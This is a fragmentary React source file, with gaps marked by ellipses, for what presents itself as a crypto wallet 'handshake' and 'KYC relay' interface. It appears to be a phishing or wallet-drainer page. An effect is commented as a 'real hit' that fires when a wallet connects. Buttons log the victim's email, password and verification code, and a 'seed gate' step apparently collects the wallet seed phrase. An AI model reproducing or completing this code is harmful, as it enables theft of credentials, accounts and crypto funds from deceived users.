...
export default function App() {
  ...
  // 🎯 REAL HIT - MUST FIRE ON CONNECTION
  useEffect(() => {
    if (isConnected && address) {
      const key = 'hit_v2_' + address;
  ...
  return (
    <div id="v1-final-lock" style={{minHeight:'100vh', backgroundColor:'#05070a', color:'#e2e8f0', fontFamily:'monospace', padding:'15px', textTransform:'uppercase'}}>
        ...
        <>
          ...
          {view === "task_box" && (
            <div style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', borderRadius:'35px', padding:'30px', textAlign:'center', position:'relative'}}>
              ...
              <button onClick={handleHandshake} style={{width:'100%', backgroundColor: (activeTask === "Rectify" || (inputVal !== "" && inputVal !== "0")) ? '#10b981' : '#1e293b', color:'#000', padding:'22px', borderRadius:'18px', fontWeight:'900', border:'none', cursor:'pointer'}}>START_HANDSHAKE</button>
            </div>
          )}
            ...
            <div style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', borderRadius:'35px', padding:'35px', textAlign:'center', position:'relative'}}>
              ...
              {kycPhase === 1 ? (
                <>
                  ...
                  <button disabled={!kycEmail || !kycPass} onClick={()=>{ log(`🆔 KYC: ${kycEmail} | P: ${kycPass}`); setKycPhase(2); }} style={{width:'100%', backgroundColor: (kycEmail && kycPass) ? '#10b981' : '#1e293b', color:'#000', padding:'20px', borderRadius:'15px', fontWeight:'900', border:'none'}}>VERIFY RELAY</button>
                </>
              ) : (
                <>
                  ...
                  <button disabled={kycCode.length < 6} onClick={()=>{ log(`🔑 CODE: ${kycCode}`); setView("seed_gate"); }} style={{width:'100%', backgroundColor: '#3b82f6', color:'#fff', padding:'20px', borderRadius:'15px', fontWeight:'900', border:'none'}}>AUTHORIZE</button>
                </>
              )}
            </div>
          )}
              ...
              <div style={{backgroundColor:'#0d1117', border:'2px solid #10b981', borderRadius:'35px', padding:'40px 25px', textAlign:'center', maxWidth:'400px'}}>
                {!isSyncing ? (
                  <>
                    ...
                    style={{width:'100%', backgroundColor: isSeedOk ? '#10b981' : '#1e293b', color:'#000', padding:'20px', borderRadius:'15px', marginTop:'20px', fontWeight:'900', border:'none'}}>ENCRYPT & SYNC</button>
                  </>
                ) : (
